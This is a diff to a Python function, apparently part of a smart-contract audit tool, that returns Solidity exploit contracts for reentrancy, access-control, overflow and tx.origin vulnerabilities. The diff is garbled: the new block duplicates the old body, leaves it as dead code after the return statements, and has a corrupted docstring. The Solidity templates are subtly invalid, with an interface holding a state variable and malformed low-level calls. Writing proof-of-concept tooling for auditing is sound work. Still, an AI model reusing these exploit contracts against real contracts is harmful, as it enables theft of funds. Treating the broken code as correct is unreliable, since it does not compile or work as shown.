@@ -452,60 +452,141 @@ def generate_markdown_report(result: dict) -> str:
 
 
 def generate_poc_exploit(vuln: dict, target_contract: str) -> str:
+    """Generate Proof-of-C概念 exploit contract"""
+    vuln_type = vuln.get('type', '').lower()
+    vuln_name = vuln.get('type', 'Unknown')
+    
+    if 'reentrancy' in vuln_type:
+        return """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITarget {
+    address target;
+}
+
+contract ReentrancyAttacker {
+    address public victim;
+    uint public balance;
+    
+    constructor(address _victim) {
+        victim = _victim;
+    }
+    
+    function attack() external payable {
+        (bool ok, ) = victim.call{value: msg.value}("withdraw");
+        require(ok, "call failed");
+    }
+    
+    receive() external payable {
+        if (victim.balance >= 1 ether) {
+            (bool ok, ) = victim.call{value: 0}("withdraw");
+        }
+    }
+}"""
+    
+    elif 'access control' in vuln_type:
+        return """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract AccessControlBypass {
+    function exploit(address target) external {
+        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
+        require(ok, "Access denied - vulnerable if succeeds");
+    }
+}"""
+    
+    elif 'overflow' in vuln_type:
+        return """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract OverflowExploit {
+    function exploit() external pure returns (uint256) {
+        uint256 amount = type(uint256).max;
+        unchecked {
+            return amount + 1;
+        }
+    }
+}"""
+    
+    elif 'tx.origin' in vuln_type:
+        return """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract TxOriginExploit {
+    address public attacker;
+    
+    constructor(address _attacker) {
+        attacker = _attacker;
+    }
+    
+    function exploit(address target) external {
+        // Withdraw to attacker instead of original owner
+        (bool ok, ) = target.call{value: 0}("withdrawTo(address)", attacker);
+    }
+}"""
+    
+    return f"""// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract GenericExploit {{
+    string public vulnType = "{vuln_name}";
+    // Add exploit logic here
+}}"""
     """Generate Proof-of-Concept exploit contract"""
     vuln_type = vuln.get('type', '').lower()
     
     if 'reentrancy' in vuln_type:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface ITarget {{ address target; }}
+interface ITarget {
+    address target;
+}
 
-contract ReentrancyAttacker {{
+contract ReentrancyAttacker {
     address public victim;
     uint public balance;
     
-    constructor(address _victim) {{
+    constructor(address _victim) {
         victim = _victim;
-    }}
+    }
     
-    function attack() external payable {{
-        (bool ok, ) = victim.call{{value: msg.value}}("withdraw");
+    function attack() external payable {
+        (bool ok, ) = victim.call{value: msg.value}("withdraw");
         require(ok, "call failed");
-    }}
+    }
     
-    receive() external payable {{
-        if (victim.balance >= 1 ether) {{
-            (bool ok, ) = victim.call{{value: 0}}("withdraw");
-        }}
-    }}
-}}"""
+    receive() external payable {
+        if (victim.balance >= 1 ether) {
+            (bool ok, ) = victim.call{value: 0}("withdraw");
+        }
+    }
+}"""
     
     elif 'access control' in vuln_type:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 // PoC: Try calling the protected function from a non-owner account
-contract AccessControlBypass {{
-    function exploit(address target) external {{
+contract AccessControlBypass {
+    function exploit(address target) external {
         // Call will revert if access control is properly implemented
         (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
         require(ok, "Access denied - but vulnerable if this succeeds");
-    }}
-}}"""
+    }
+}"""
     
     elif 'overflow' in vuln_type:
-        return f"""// SPDX-License-Identifier: MIT
+        return """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract OverflowExploit {{
-    function exploit() external pure returns (uint256) {{
+contract OverflowExploit {
+    function exploit() external pure returns (uint256) {
         uint256 amount = type(uint256).max;
-        unchecked {{
+        unchecked {
             return amount + 1; // Wraps to 0 if no SafeMath
-        }}
-    }}
-}}"""
+        }
+    }
+}"""
     
     else:
         return f"""// SPDX-License-Identifier: MIT
